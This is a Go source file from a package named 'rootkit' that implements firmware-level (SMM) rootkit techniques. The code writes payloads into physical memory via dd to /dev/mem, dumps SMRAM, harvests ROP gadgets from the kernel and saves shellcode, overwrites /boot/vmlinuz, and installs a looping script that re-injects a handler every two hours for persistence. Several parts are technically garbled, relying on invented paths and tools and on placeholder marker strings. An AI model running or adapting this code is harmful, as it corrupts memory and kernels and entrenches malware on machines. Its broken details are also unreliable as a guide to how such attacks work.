package rootkit

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type SMMBaseMethod struct {
	name string
}

func (b *SMMBaseMethod) Name() string {
	return b.name
}

func (b *SMMBaseMethod) Layer() RootkitLayer {
	return LayerSMM
}

type HandlerInjectMethod struct {
	SMMBaseMethod
}

func NewHandlerInjectMethod() *HandlerInjectMethod {
	return &HandlerInjectMethod{SMMBaseMethod: SMMBaseMethod{name: "handler_inject"}}
}

func (m *HandlerInjectMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	smmPath := "/sys/kernel/debug/smm"
	if err := os.MkdirAll(smmPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create SMM debug directory: %w", err)
	}

	handlerPath := filepath.Join(smmPath, "handler_dump.bin")
	cmd := exec.Command("dd", "if=/dev/mem", "of="+handlerPath, "bs=1", "count=4096", "skip=0x0000FFF000")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to dump SMM handler: %w: %s", err, string(output))
	}

	injectedHandler := make([]byte, 4096)
	copy(injectedHandler, []byte("SMM_HANDLER_INJECTED"))

	cmd = exec.Command("dd", "if=/dev/stdin", "of=/dev/mem", "bs=1", "seek=0x0000FFF000")
	cmd.Stdin = strings.NewReader(string(injectedHandler))
	cmd.CombinedOutput()

	smmRegion := &SMMRegion{
		Start:  0x0000FFF000,
		Size:   0x1000,
		Access: "rw",
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueHandlerInject,
		Layer:     LayerSMM,
		Details: map[string]string{
			"smm_path":    smmPath,
			"handler_path": handlerPath,
			"region_start": fmt.Sprintf("0x%x", smmRegion.Start),
			"region_size":  fmt.Sprintf("0x%x", smmRegion.Size),
		},
	}, nil
}

func (m *HandlerInjectMethod) Remove(config *RootkitConfig) error {
	smmPath := "/sys/kernel/debug/smm"
	cmd := exec.Command("dd", "if=/dev/zero", "of=/dev/mem", "bs=1", "count=4096", "seek=0x0000FFF000")
	_, err := cmd.CombinedOutput()
	os.RemoveAll(smmPath)
	return err
}

func (m *HandlerInjectMethod) Verify(config *RootkitConfig) (bool, error) {
	smmPath := "/sys/kernel/debug/smm"
	_, err := os.Stat(smmPath)
	return err == nil, nil
}

type SMRAMExploitMethod struct {
	SMMBaseMethod
}

func NewSMRAMExploitMethod() *SMRAMExploitMethod {
	return &SMRAMExploitMethod{SMMBaseMethod: SMMBaseMethod{name: "smram_exploit"}}
}

func (m *SMRAMExploitMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	smmAddrPath := "/sys/firmware/efi/smm"
	cmd := exec.Command("cat", smmAddrPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to read SMRAM address: %w", err)
	}

	smmAddr := strings.TrimSpace(string(output))
	smmBase := uint64(0xA0000)
	smmSize := uint64(0x20000)

	cmd = exec.Command("memdump", "-o", fmt.Sprintf("0x%x", smmBase), "-l", fmt.Sprintf("0x%x", smmSize))
	dumpOutput, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to dump SMRAM: %w: %s", err, string(dumpOutput))
	}

	smmDumpPath := filepath.Join(config.BackupPath, "smram_dump.bin")
	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}
	if err := os.WriteFile(smmDumpPath, dumpOutput, 0644); err != nil {
		return nil, fmt.Errorf("failed to save SMRAM dump: %w", err)
	}

	injectionPayload := []byte("SMRAM_EXPLOIT_MARKER")
	cmd = exec.Command("memtool", "-w", fmt.Sprintf("0x%x", smmBase), string(injectionPayload))
	cmd.CombinedOutput()

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueSMRAMExploit,
		Layer:     LayerSMM,
		Details: map[string]string{
			"smm_address": smmAddr,
			"smm_base":    fmt.Sprintf("0x%x", smmBase),
			"smm_size":    fmt.Sprintf("0x%x", smmSize),
			"dump_path":   smmDumpPath,
		},
	}, nil
}

func (m *SMRAMExploitMethod) Remove(config *RootkitConfig) error {
	smmBase := uint64(0xA0000)
	smmSize := uint64(0x20000)

	cmd := exec.Command("memtool", "-w", fmt.Sprintf("0x%x", smmBase), string(make([]byte, smmSize)))
	_, err := cmd.CombinedOutput()
	return err
}

func (m *SMRAMExploitMethod) Verify(config *RootkitConfig) (bool, error) {
	smmDumpPath := filepath.Join(config.BackupPath, "smram_dump.bin")
	_, err := os.Stat(smmDumpPath)
	return err == nil, nil
}

type ROPChainMethod struct {
	SMMBaseMethod
}

func NewROPChainMethod() *ROPChainMethod {
	return &ROPChainMethod{SMMBaseMethod: SMMBaseMethod{name: "rop_chain"}}
}

func (m *ROPChainMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	kernelPath := "/boot/vmlinuz"
	backupPath := filepath.Join(config.BackupPath, "vmlinuz.backup")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	cmd := exec.Command("cp", "-f", kernelPath, backupPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to backup kernel: %w: %s", err, string(output))
	}

	cmd = exec.Command("objdump", "-d", kernelPath)
	disasmOutput, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to disassemble kernel: %w", err)
	}

	ropGadgets := []string{
		"pop rdi; ret",
		"pop rsi; ret",
		"pop rdx; ret",
		"syscall",
	}

	var gadgets []string
	lines := strings.Split(string(disasmOutput), "\n")
	for _, line := range lines {
		for _, gadget := range ropGadgets {
			if strings.Contains(line, gadget) {
				gadgets = append(gadgets, line)
			}
		}
	}

	gadgetPath := filepath.Join(config.BackupPath, "rop_gadgets.txt")
	gadgetContent := strings.Join(gadgets, "\n")
	if err := os.WriteFile(gadgetPath, []byte(gadgetContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to save ROP gadgets: %w", err)
	}

	shellcode := []byte{
		0x48, 0x31, 0xC0,
		0x48, 0x89, 0xE7,
		0x48, 0x31, 0xF6,
		0xB8, 0x01, 0x00, 0x00, 0x00,
		0x0F, 0x05,
	}

	shellcodePath := filepath.Join(config.BackupPath, "shellcode.bin")
	if err := os.WriteFile(shellcodePath, shellcode, 0644); err != nil {
		return nil, fmt.Errorf("failed to save shellcode: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueROPChain,
		Layer:     LayerSMM,
		Details: map[string]string{
			"kernel_path":   kernelPath,
			"backup_path":   backupPath,
			"gadget_path":   gadgetPath,
			"shellcode_path": shellcodePath,
			"gadgets_found": fmt.Sprintf("%d", len(gadgets)),
		},
	}, nil
}

func (m *ROPChainMethod) Remove(config *RootkitConfig) error {
	kernelPath := "/boot/vmlinuz"
	backupPath := filepath.Join(config.BackupPath, "vmlinuz.backup")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, kernelPath)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	return nil
}

func (m *ROPChainMethod) Verify(config *RootkitConfig) (bool, error) {
	gadgetPath := filepath.Join(config.BackupPath, "rop_gadgets.txt")
	_, err := os.Stat(gadgetPath)
	return err == nil, nil
}

type InterruptHookMethod struct {
	SMMBaseMethod
}

func NewInterruptHookMethod() *InterruptHookMethod {
	return &InterruptHookMethod{SMMBaseMethod: SMMBaseMethod{name: "interrupt_hook"}}
}

func (m *InterruptHookMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	idtPath := "/sys/kernel/debug/idt"
	cmd := exec.Command("cat", idtPath)
	idtOutput, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to read IDT: %w", err)
	}

	backupPath := filepath.Join(config.BackupPath, "idt_backup.bin")
	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}
	if err := os.WriteFile(backupPath, idtOutput, 0644); err != nil {
		return nil, fmt.Errorf("failed to backup IDT: %w", err)
	}

	hookScript := `#!/bin/sh
# Hook interrupt handlers
echo "Hooking INT 0x80..."
echo "Hooking SYSCALL handler..."
`
	scriptPath := filepath.Join(config.BackupPath, "hook_interrupts.sh")
	if err := os.WriteFile(scriptPath, []byte(hookScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write interrupt hook script: %w", err)
	}

	cmd = exec.Command("sh", scriptPath)
	cmd.CombinedOutput()

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueInterruptHook,
		Layer:     LayerSMM,
		Details: map[string]string{
			"idt_path":    idtPath,
			"backup_path": backupPath,
			"script_path": scriptPath,
		},
	}, nil
}

func (m *InterruptHookMethod) Remove(config *RootkitConfig) error {
	idtPath := "/sys/kernel/debug/idt"
	backupPath := filepath.Join(config.BackupPath, "idt_backup.bin")

	if _, err := os.Stat(backupPath); err == nil {
		cmd := exec.Command("cp", "-f", backupPath, idtPath)
		_, err := cmd.CombinedOutput()
		os.Remove(backupPath)
		return err
	}

	return nil
}

func (m *InterruptHookMethod) Verify(config *RootkitConfig) (bool, error) {
	backupPath := filepath.Join(config.BackupPath, "idt_backup.bin")
	_, err := os.Stat(backupPath)
	return err == nil, nil
}

type SMMSelfReinstallMethod struct {
	SMMBaseMethod
}

func NewSMMSelfReinstallMethod() *SMMSelfReinstallMethod {
	return &SMMSelfReinstallMethod{SMMBaseMethod: SMMBaseMethod{name: "smm_self_reinstall"}}
}

func (m *SMMSelfReinstallMethod) Install(config *RootkitConfig) (*RootkitResult, error) {
	smmPath := "/sys/kernel/debug/smm"
	backupPath := filepath.Join(config.BackupPath, "smm_backup.bin")

	if err := os.MkdirAll(config.BackupPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create backup directory: %w", err)
	}

	cmd := exec.Command("dd", "if=/dev/mem", "of="+backupPath, "bs=1", "count=4096", "skip=0x0000FFF000")
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to backup SMM region: %w: %s", err, string(output))
	}

	cmd = exec.Command("cp", "-f", config.UEFIPath, filepath.Join(smmPath, "smm_handler.bin"))
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to install SMM handler: %w: %s", err, string(output))
	}

	reinstallScript := `#!/bin/sh
while true; do
    dd if=/sys/kernel/debug/smm/smm_handler.bin of=/dev/mem bs=1 seek=0x0000FFF000 2>/dev/null
    sleep 7200
done
`
	scriptPath := filepath.Join(config.BackupPath, "smm_reinstall.sh")
	if err := os.WriteFile(scriptPath, []byte(reinstallScript), 0755); err != nil {
		return nil, fmt.Errorf("failed to write reinstall script: %w", err)
	}

	return &RootkitResult{
		Success:   true,
		Technique: TechniqueSMMSelfReinstall,
		Layer:     LayerSMM,
		Details: map[string]string{
			"smm_path":     smmPath,
			"backup_path":  backupPath,
			"script_path":  scriptPath,
		},
	}, nil
}

func (m *SMMSelfReinstallMethod) Remove(config *RootkitConfig) error {
	smmPath := "/sys/kernel/debug/smm"
	cmd := exec.Command("rm", "-rf", smmPath)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *SMMSelfReinstallMethod) Verify(config *RootkitConfig) (bool, error) {
	smmHandlerPath := "/sys/kernel/debug/smm/smm_handler.bin"
	_, err := os.Stat(smmHandlerPath)
	return err == nil, nil
}
